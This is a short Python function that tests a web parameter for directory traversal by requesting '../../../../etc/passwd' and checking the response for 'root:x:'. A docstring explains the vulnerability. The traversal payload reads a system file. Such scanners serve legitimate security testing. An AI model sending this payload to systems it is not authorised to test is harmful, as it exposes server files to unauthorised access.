import requests

'''
    Directory traversal, also known as path traversal or directory climbing, 
    is a vulnerability in a web application server caused by a HTTP exploit. 
    The exploit allows an attacker to access restricted directories, execute commands, 
    and view data outside of the web root folder where application content is stored.    
'''
def test_directory_traversal(url, param):
    payload = "../../../../etc/passwd"
    full_url = f"{url}?{param}={payload}"

    proxies = {
        "http": None,
        "https": None,
    }
    response = requests.get(full_url)
    if "root:x:" in response.text:
        return f"Directory Traversal Vulnerability Found at {full_url}"
    return f"No Directory Traversal Vulnerability Found at {full_url}"
